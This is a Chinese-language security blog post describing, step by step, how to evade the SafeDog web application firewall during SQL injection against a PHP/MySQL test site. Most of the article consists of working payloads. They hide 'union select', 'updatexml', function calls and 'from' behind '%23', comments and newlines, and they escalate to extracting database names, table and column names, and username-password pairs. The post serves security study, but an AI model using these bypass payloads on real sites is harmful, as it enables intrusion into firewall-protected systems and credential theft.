<!DOCTYPE html><html lang="zh-CN" data-default-color-scheme="auto"><head><meta charset="UTF-8"><link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png"><link rel="icon" href="/img/fluid.png"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=5,shrink-to-fit=no"><meta http-equiv="x-ua-compatible" content="ie=edge"><meta name="theme-color" content="#2f4154"><meta name="author" content="wanf3ng"><meta name="keywords" content="网络安全,晚风,wanf3ng"><meta name="description" content="版本环境PHP：5.6.9 mysql：8.0.12 安全狗：V4.0.23137 apache：2.4.39 手工注入步骤拆解通过手工注入验证注入点，直到查出表名、列名、字段名，最后爆出数据。 and判断注入点首先按照常规的判断注入点的方式1&#39; and 1&#x3D;1--+一点一点输入，刚开始安全狗不拦截，直到1&#39; and后面再输入字符就会拦截。  再把后面一位fuzz一下，发现用十六进"><meta property="og:type" content="article"><meta property="og:title" content="sql注入全方位绕过安全狗"><meta property="og:url" content="https://wanf3ng.github.io/2022/04/13/sql%E6%B3%A8%E5%85%A5%E5%85%A8%E6%96%B9%E4%BD%8D%E7%BB%95%E8%BF%87%E5%AE%89%E5%85%A8%E7%8B%97/index.html"><meta property="og:site_name" content="wanf3ng&#39;s blog"><meta property="og:description" content="版本环境PHP：5.6.9 mysql：8.0.12 安全狗：V4.0.23137 apache：2.4.39 手工注入步骤拆解通过手工注入验证注入点，直到查出表名、列名、字段名，最后爆出数据。 and判断注入点首先按照常规的判断注入点的方式1&#39; and 1&#x3D;1--+一点一点输入，刚开始安全狗不拦截，直到1&#39; and后面再输入字符就会拦截。  再把后面一位fuzz一下，发现用十六进"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://s2.loli.net/2022/03/24/sqQ8kZrjR7GEY1W.jpg"><meta property="article:published_time" content="2022-04-13T12:27:40.000Z"><meta property="article:modified_time" content="2022-05-20T06:20:22.000Z"><meta property="article:author" content="wanf3ng"><meta property="article:tag" content="sql注入"><meta property="article:tag" content="bypass"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:image" content="https://s2.loli.net/2022/03/24/sqQ8kZrjR7GEY1W.jpg"><meta name="referrer" content="no-referrer-when-downgrade"><title>sql注入全方位绕过安全狗 - wanf3ng&#39;s blog</title><link rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css"><link rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css"><link rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css"><link rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css"><link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css"><link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css"><link rel="stylesheet" href="/css/main.css"><link id="highlight-css" rel="stylesheet" href="/css/highlight.css"><link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css"><link rel="stylesheet" href="/css/custom.css"><script id="fluid-configs">var Fluid=window.Fluid||{};Fluid.ctx=Object.assign({},Fluid.ctx);var CONFIG={hostname:"wanf3ng.github.io",root:"/",version:"1.9.5-a",typing:{enable:!0,typeSpeed:70,cursorChar:"_",loop:!1,scope:[]},anchorjs:{enable:!0,element:"h1,h2,h3,h4,h5,h6",placement:"left",visible:"hover",icon:""},progressbar:{enable:!0,height_px:3,color:"#29d",options:{showSpinner:!1,trickleSpeed:100}},code_language:{enable:!0,default:"TEXT"},copy_btn:!0,image_caption:{enable:!0},image_zoom:{enable:!0,img_url_replace:["",""]},toc:{enable:!0,placement:"right",headingSelector:"h1,h2,h3,h4,h5,h6",collapseDepth:0},lazyload:{enable:!0,loading_img:"/img/loading.gif",onlypost:!1,offset_factor:2},web_analytics:{enable:!0,follow_dnt:!0,baidu:"952845559a725a8f8506594fda37c635",google:{measurement_id:null},tencent:{sid:null,cid:null},woyaola:null,cnzz:null,leancloud:{app_id:null,app_key:null,server_url:null,path:"window.location.pathname",ignore_local:!1}},search_path:"/local-search.xml",include_content_in_search:!0};if(CONFIG.web_analytics.follow_dnt){var dntVal=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack;Fluid.ctx.dnt=dntVal&&(dntVal.startsWith("1")||dntVal.startsWith("yes")||dntVal.startsWith("on"))}</script><script src="/js/utils.js"></script><script src="/js/color-schema.js"></script><script async>if(!Fluid.ctx.dnt){var _hmt=_hmt||[];!function(){var t=document.createElement("script");t.src="https://hm.baidu.com/hm.js?952845559a725a8f8506594fda37c635";var e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(t,e)}()}</script><script async>Fluid.ctx.dnt||Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=",(function(){function a(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],a("js",new Date),a("config","")}))</script><meta name="generator" content="Hexo 6.3.0"><link rel="sitemap" type="application/xml" title="Sitemap" href="/sitemap.xml"></head><body><header><div class="header-inner" style="height:70vh"><nav id="navbar" class="navbar fixed-top navbar-expand-lg navbar-dark scrolling-navbar"><div class="container"><a class="navbar-brand" href="/"><strong>晚风</strong> </a><button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation"><div class="animated-icon"><span></span><span></span><span></span></div></button><div class="collapse navbar-collapse" id="navbarSupportedContent"><ul class="navbar-nav ml-auto text-center"><li class="nav-item"><a class="nav-link" href="/"><i class="iconfont icon-home-fill"></i> <span>首页</span></a></li><li class="nav-item"><a class="nav-link" href="/archives/"><i class="iconfont icon-archive-fill"></i> <span>归档</span></a></li><li class="nav-item"><a class="nav-link" href="/categories/"><i class="iconfont icon-category-fill"></i> <span>分类</span></a></li><li class="nav-item"><a class="nav-link" href="/tags/"><i class="iconfont icon-tags-fill"></i> <span>标签</span></a></li><li class="nav-item"><a class="nav-link" href="/about/"><i class="iconfont icon-user-fill"></i> <span>关于</span></a></li><li class="nav-item" id="search-btn"><a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search"><i class="iconfont icon-search"></i></a></li><li class="nav-item" id="color-toggle-btn"><a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle"><i class="iconfont icon-dark" id="color-toggle-icon"></i></a></li></ul></div></div></nav><div id="banner" class="banner" parallax="true" style="background:url(/img/default.png) no-repeat center center;background-size:cover"><div class="full-bg-img"><div class="mask flex-center" style="background-color:rgba(0,0,0,.3)"><div class="banner-text text-center fade-in-up"><div class="h2"><span id="subtitle" data-typed-text="sql注入全方位绕过安全狗"></span></div><div class="mt-3"><span class="post-meta mr-2"><i class="iconfont icon-author" aria-hidden="true"></i> wanf3ng </span><span class="post-meta"><i class="iconfont icon-date-fill" aria-hidden="true"></i> <time datetime="2022-04-13 20:27" pubdate>2022年4月13日 晚上</time></span></div><div class="mt-1"><span class="post-meta mr-2"><i class="iconfont icon-chart"></i> 2.4k 字 </span><span class="post-meta mr-2"><i class="iconfont icon-clock-fill"></i> 21 分钟 </span><span id="busuanzi_container_page_pv" style="display:none"><i class="iconfont icon-eye" aria-hidden="true"></i> <span id="busuanzi_value_page_pv"></span> 次</span></div></div></div></div></div></div></header><main><div class="container-fluid nopadding-x"><div class="row nomargin-x"><div class="side-col d-none d-lg-block col-lg-2"></div><div class="col-lg-8 nopadding-x-md"><div class="container nopadding-x-md" id="board-ctn"><div id="board"><article class="post-content mx-auto"><h1 id="seo-header">sql注入全方位绕过安全狗</h1><div class="markdown-body"><h2 id="版本环境"><a href="#版本环境" class="headerlink" title="版本环境"></a>版本环境</h2><p>PHP：5.6.9</p><p>mysql：8.0.12</p><p>安全狗：V4.0.23137</p><p>apache：2.4.39</p><h2 id="手工注入步骤拆解"><a href="#手工注入步骤拆解" class="headerlink" title="手工注入步骤拆解"></a>手工注入步骤拆解</h2><p>通过手工注入验证注入点，直到查出表名、列名、字段名，最后爆出数据。</p><h3 id="and判断注入点"><a href="#and判断注入点" class="headerlink" title="and判断注入点"></a>and判断注入点</h3><p>首先按照常规的判断注入点的方式<code>1&#39; and 1=1--+</code>一点一点输入，刚开始安全狗不拦截，直到<code>1&#39; and</code>后面再输入字符就会拦截。</p><p><img src="/image-20220414133442158.png" srcset="/img/loading.gif" lazyload alt="image-20220414133442158"></p><p>再把后面一位fuzz一下，发现用十六进制安全狗不拦截。此时payload为<code>1&#39; and 0x3a</code></p><p><img src="/image-20220414170130436.png" srcset="/img/loading.gif" lazyload alt="image-20220414170130436"></p><p>那就继续尝试<code>1&#39; and 0x3a=0x3a</code>，被拦截了</p><p><img src="/image-20220414170158176.png" srcset="/img/loading.gif" lazyload alt="image-20220414170158176"></p><p>换不等号试试，可以绕过</p><p><img src="/image-20220414170259411.png" srcset="/img/loading.gif" lazyload alt="image-20220414170259411"></p><p><img src="/image-20220414170317990.png" srcset="/img/loading.gif" lazyload alt="image-20220414170317990"></p><p>所以最终payload为<code>1&#39; and 0x3a!=1--+</code>当然这里的0x3a可以替换为任意的十六进制字符串</p><h3 id="order-by获取字段个数"><a href="#order-by获取字段个数" class="headerlink" title="order by获取字段个数"></a>order by获取字段个数</h3><p>用常见的payload <code>1&#39; order by 4--+</code>获取字段数会被安全狗拦截</p><p><img src="/image-20220415101651580.png" srcset="/img/loading.gif" lazyload alt="image-20220415101651580"></p><p>改用into+变量的方式绕过，在三个变量的时候页面没有显示</p><p><img src="/image-20220415101751411.png" srcset="/img/loading.gif" lazyload alt="image-20220415101751411"></p><p>在4个变量的时候页面报错了，说明该表的字段数为3个</p><p><img src="/image-20220415101810659.png" srcset="/img/loading.gif" lazyload alt="image-20220415101810659"></p><p>当然不输入变量名也可以，会让payload更简洁</p><p><img src="/image-20220415102031203.png" srcset="/img/loading.gif" lazyload alt="image-20220415102031203"></p><p>payload：</p><blockquote><p>1’ into @a,@b,@c,@d–+</p><p>或</p><p>1’ into @,@,@,@–+</p></blockquote><h3 id="union-select绕过"><a href="#union-select绕过" class="headerlink" title="union select绕过"></a>union select绕过</h3><p>这里的规则挺强的，猜测union select之间加入任何字符都会被拦截，经过fuzz测试发现加入井号#不会被拦截，而是报错，锚点这个特性应该是个突破口</p><p>这里参考了一下pureqh师傅的order by绕过姿势<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10479">SQL注入bypass最新版安全狗</a>，顺便简化了一下，直接给payload</p><blockquote><p>1’regexp”%23”union%0aselect 1,2,3–+</p></blockquote><p><img src="/image-20220415112442248.png" srcset="/img/loading.gif" lazyload alt="image-20220415112442248"></p><p>那么同理把正则匹配的函数换了一下应该也行，换成like确实也可以</p><blockquote><p>1’like”%23”union%0aselect 1,2,3–+</p></blockquote><p><img src="/image-20220415112459500.png" srcset="/img/loading.gif" lazyload alt="image-20220415112459500"></p><h3 id="报错注入获取数据库名"><a href="#报错注入获取数据库名" class="headerlink" title="报错注入获取数据库名"></a>报错注入获取数据库名</h3><p>先放一个经典报错注入payload，毫无疑问直接被拦截了</p><blockquote><p>1’ and(updatexml(1,concat(0x7e,(select user()),0x7e),1))–+</p></blockquote><p>还是一点一点测试，<code>1&#39; and(updatexml(</code>不会拦截，但<code>1%27%20and(updatexml()</code>就会被拦截，说明规则检测了updatexml后面不能跟一对完整的括号()。虽然在括号里输入一些字符也不会拦截，但只要输入满3个变量安全狗还是会拦截，说明并没有完全绕过。于是还是同样的方法，用井号+换行符绕过函数后面跟括号的这个规则。</p><blockquote><p>1’like”%23”and(updatexml(1,%0a1,1))–+</p></blockquote><p><img src="/image-20220415124323891.png" srcset="/img/loading.gif" lazyload alt="image-20220415124323891"></p><p>接下来的问题就是要让它报错来显示当前用户名（显示数据库名同理）。把中间的字符串直接替换成<code>select user()</code>还是被拦截了。估计也是函数名后面跟一对括号就会被拦截的问题。ok没事，继续构造。首先我们知道函数名和括号直接可以加空格也可以正常执行，所以在这之间加入<code>/*like&quot;%23&quot;*/%0a</code>，一个注释加一个换行符，其实就相当于一个空格来把user和()间隔开。成功绕过，得到了当前用户名，最终payload</p><blockquote><p>1’like”%23”and(updatexml(1,(select user&#x2F;*like”%23”*&#x2F;%0a()),1))–+</p></blockquote><p><img src="/image-20220415125535140.png" srcset="/img/loading.gif" lazyload alt="image-20220415125535140"></p><p>显示数据库的时候没有显示出来，对着经典报错注入payload稍微修改了下就好了</p><blockquote><p>1%27like”%23”and(updatexml(1,concat(0x7e,(select%0adatabase&#x2F;*like”%23”*&#x2F;%0a()),0x7e),1))–+</p></blockquote><p><img src="/image-20220415130333594.png" srcset="/img/loading.gif" lazyload alt="image-20220415130333594"></p><p>显示数据库版本也是同理</p><blockquote><p>1%27like”%23”and(updatexml(1,concat(0x7e,(select%0aversion&#x2F;*like”%23”*&#x2F;%0a()),0x7e),1))–+</p></blockquote><p><img src="/image-20220415130358652.png" srcset="/img/loading.gif" lazyload alt="image-20220415130358652"></p><h3 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h3><p>有了数据库名之后，获取当前数据库中的表名，依旧是一点点绕过。尝试到<code>1&#39;like&quot;%23&quot;union%0aselect 1,(select group_concat(table_name) from</code>后面无论加什么字符都会被拦截了</p><p><img src="/image-20220417170142102.png" srcset="/img/loading.gif" lazyload alt="image-20220417170142102"></p><p>尝试把”from“的“m”删除，发现可以通过，说明这里匹配了from后面的任何字符。继续尝试用井号绕过。</p><p><img src="/image-20220417170155815.png" srcset="/img/loading.gif" lazyload alt="image-20220417170155815"></p><blockquote><p>1’like”%23”union%0aselect 1,(select group_concat(table_name) from&#x2F;*%23*&#x2F;information_schema.tables where table_schema&#x3D;database%0a()),3–+</p></blockquote><p><img src="/image-20220423122804456.png" srcset="/img/loading.gif" lazyload alt="image-20220423122804456"></p><h3 id="获取字段名"><a href="#获取字段名" class="headerlink" title="获取字段名"></a>获取字段名</h3><blockquote><p>1’like”%23”union%0aselect 1,(select group_concat(column_name) from&#x2F;*%23*&#x2F;information_schema.columns where table_name&#x3D;%0a’users’),3–+</p></blockquote><p><img src="/image-20220423172052415.png" srcset="/img/loading.gif" lazyload alt="image-20220423172052415"></p><h3 id="获取字段值"><a href="#获取字段值" class="headerlink" title="获取字段值"></a>获取字段值</h3><p>根据刚刚的测试，只要from后面跟一个空格再加一个字符，就会触发拦截。说明from这里有强检测。用井号和换行符将from包裹起来即可。</p><blockquote><p>1’like”%23”union%0aselect 1,group_concat(username,’-‘,password),3&#x2F;*%23*&#x2F;from%0ausers–+</p></blockquote><p><img src="/image-20220423172855533.png" srcset="/img/loading.gif" lazyload alt="image-20220423172855533"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li>在安全狗有强检测关键字的地方，可以用井号和换行符的组合绕过。并且可以将井号包含在注释符中，<code>/*%23*/</code>这样就相当于一个空格，而不影响整个sql语句的执行。而<code>%0a</code>换行符本身就相当于一个空格，就不需要包含在注释符里了</li><li>井号其实是html的锚点功能，如果安全狗将其拦截，会对业务有很大的影响。在安全与业务冲突时，安全也得给业务让道，所以安全与业务产生冲突的边界恰恰是最薄弱的地方</li></ol></div><hr><div><div class="post-metas my-3"><div class="post-meta mr-3 d-flex align-items-center"><i class="iconfont icon-category"></i> <span class="category-chains"><span class="category-chain"><a href="/categories/%E6%8A%80%E6%9C%AF/" class="category-chain-item">技术</a> <span>></span> <a href="/categories/%E6%8A%80%E6%9C%AF/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="category-chain-item">网络安全</a></span></span></div><div class="post-meta"><i class="iconfont icon-tags"></i> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" class="print-no-link">#sql注入</a> <a href="/tags/bypass/" class="print-no-link">#bypass</a></div></div><div class="license-box my-3"><div class="license-title"><div>sql注入全方位绕过安全狗</div><div>https://wanf3ng.github.io/2022/04/13/sql注入全方位绕过安全狗/</div></div><div class="license-meta"><div class="license-meta-item"><div>作者</div><div>wanf3ng</div></div><div class="license-meta-item license-meta-date"><div>发布于</div><div>2022年4月13日</div></div><div class="license-meta-item"><div>许可协议</div><div><a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/"><span class="hint--top hint--rounded" aria-label="BY - 署名"><i class="iconfont icon-by"></i></span></a></div></div></div><div class="license-icon iconfont"></div></div><div class="post-prevnext my-3"><article class="post-prev col-6"><a href="/2022/04/25/%E9%80%9A%E8%BF%87sqli-labs-Less24%E5%AD%A6%E4%B9%A0sql%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/" title="通过sqli-labs-Less24学习sql二次注入"><i class="iconfont icon-arrowleft"></i> <span class="hidden-mobile">通过sqli-labs-Less24学习sql二次注入</span> <span class="visible-mobile">上一篇</span></a></article><article class="post-next col-6"><a href="/2022/03/23/ToDo_List/" title="ToDo List"><span class="hidden-mobile">ToDo List</span> <span class="visible-mobile">下一篇</span> <i class="iconfont icon-arrowright"></i></a></article></div></div><article id="comments" lazyload><div id="valine"></div><script type="text/javascript">Fluid.utils.loadComments("#valine",(function(){Fluid.utils.createScript("https://lib.baomitu.com/valine/1.5.1/Valine.min.js",(function(){var i=Object.assign({appId:"p02g21Pc8PhKfLm9ib0EkgvU-gzGzoHsz",appKey:"WvjDJdcuEIzre37U5HgmMBRy",path:"window.location.pathname",placeholder:"说点什么",avatar:"retro",meta:["nick","mail","link"],requiredFields:[],pageSize:10,lang:"zh-CN",highlight:!0,recordIP:!0,serverURLs:"",emojiCDN:null,emojiMaps:null,enableQQ:!0},{el:"#valine",path:window.location.pathname});new Valine(i),Fluid.utils.waitElementVisible("#valine .vcontent",()=>{var i="#valine .vcontent img:not(.vemoji)";Fluid.plugins.imageCaption(i),Fluid.plugins.fancyBox(i)})}))}))</script><noscript>Please enable JavaScript to view the comments</noscript></article></article></div></div></div><div class="side-col d-none d-lg-block col-lg-2"><aside class="sidebar" style="margin-left:-1rem"><div id="toc"><p class="toc-header"><i class="iconfont icon-list"></i> <span>目录</span></p><div class="toc-body" id="toc-body"></div></div></aside></div></div></div><a id="scroll-top-button" aria-label="TOP" href="#" role="button"><i class="iconfont icon-arrowup" aria-hidden="true"></i></a><div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true"><div class="modal-dialog modal-dialog-scrollable modal-lg" role="document"><div class="modal-content"><div class="modal-header text-center"><h4 class="modal-title w-100 font-weight-bold">搜索</h4><button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button></div><div class="modal-body mx-3"><div class="md-form mb-5"><input type="text" id="local-search-input" class="form-control validate"> <label data-error="x" data-success="v" for="local-search-input">关键词</label></div><div class="list-group" id="local-search-result"></div></div></div></div></div></main><footer><div class="footer-inner"><div class="footer-content"><a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a><div style="font-size:.85rem"><span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span><script src="/js/duration.js"></script></div></div><div class="statistics"><span id="busuanzi_container_site_pv" style="display:none">总访问量 <span id="busuanzi_value_site_pv"></span> 次 </span><span id="busuanzi_container_site_uv" style="display:none">总访客数 <span id="busuanzi_value_site_uv"></span> 人</span></div></div></footer><script src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js"></script><link rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css"><script>NProgress.configure({showSpinner:!1,trickleSpeed:100}),NProgress.start(),window.addEventListener("load",(function(){NProgress.done()}))</script><script src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js"></script><script src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js"></script><script src="/js/events.js"></script><script src="/js/plugins.js"></script><script src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js"></script><script>!function(t,e){var i=Fluid.plugins.typing,n=e.getElementById("subtitle");n&&i&&i(n.getAttribute("data-typed-text"))}(window,document)</script><script src="/js/img-lazyload.js"></script><script>Fluid.utils.createScript("https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js",(function(){var t=jQuery("#toc");if(0!==t.length&&window.tocbot){var i=jQuery("#board-ctn").offset().top;window.tocbot.init(Object.assign({tocSelector:"#toc-body",contentSelector:".markdown-body",linkClass:"tocbot-link",activeLinkClass:"tocbot-active-link",listClass:"tocbot-list",isCollapsedClass:"tocbot-is-collapsed",collapsibleClass:"tocbot-is-collapsible",scrollSmooth:!0,includeTitleTags:!0,headingsOffset:-i},CONFIG.toc)),t.find(".toc-list-item").length>0&&t.css("visibility","visible"),Fluid.events.registerRefreshCallback((function(){if("tocbot"in window){tocbot.refresh();var t=jQuery("#toc");if(0===t.length||!tocbot)return;t.find(".toc-list-item").length>0&&t.css("visibility","visible")}}))}}))</script><script src="https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js"></script><script>Fluid.plugins.codeWidget()</script><script>Fluid.utils.createScript("https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js",(function(){window.anchors.options={placement:CONFIG.anchorjs.placement,visible:CONFIG.anchorjs.visible},CONFIG.anchorjs.icon&&(window.anchors.options.icon=CONFIG.anchorjs.icon);var n=(CONFIG.anchorjs.element||"h1,h2,h3,h4,h5,h6").split(","),o=[];for(var s of n)o.push(".markdown-body > "+s.trim());"left"===CONFIG.anchorjs.placement&&(window.anchors.options.class="anchorjs-link-left"),window.anchors.add(o.join(", ")),Fluid.events.registerRefreshCallback((function(){if("anchors"in window){anchors.removeAll();var n=(CONFIG.anchorjs.element||"h1,h2,h3,h4,h5,h6").split(","),o=[];for(var s of n)o.push(".markdown-body > "+s.trim());"left"===CONFIG.anchorjs.placement&&(anchors.options.class="anchorjs-link-left"),anchors.add(o.join(", "))}}))}))</script><script>Fluid.utils.createScript("https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js",(function(){Fluid.plugins.fancyBox()}))</script><script>Fluid.plugins.imageCaption()</script><script src="/js/local-search.js"></script><script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="/js/custom.js"></script><script src="/js/boot.js"></script><noscript><div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div></noscript></body></html>